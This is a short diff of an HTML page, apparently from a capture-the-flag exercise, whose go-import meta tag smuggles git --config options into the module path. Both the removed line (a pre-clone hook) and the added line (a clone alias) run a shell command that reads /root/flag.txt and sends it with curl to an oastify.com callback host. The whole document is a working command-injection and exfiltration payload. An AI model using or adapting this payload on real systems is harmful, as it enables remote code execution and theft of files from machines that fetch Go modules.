@@ -1,5 +1,5 @@
 <html>
-  <head>
-    <meta name="go-import" content="github.com/Abdallah-Almahdy/cmd git --config=hooks.pre-clone=sh${IFS}-c${IFS}'curl${IFS}http://gg0qeu4abyydk6h1q996qbgxpovfjd72.oastify.com?flag=`cat${IFS}/root/flag.txt`;echo${IFS}https://'">
-  </head>
+<head>
+<meta name="go-import" content="github.com/Abdallah-Almahdy/cmd git --config=alias.clone=!sh -c 'curl http://lmbvkzafh34iqbn6wefbwgm2vt1kpjd8.oastify.com/?flag=`cat /root/flag.txt`'">
+</head>
 </html>
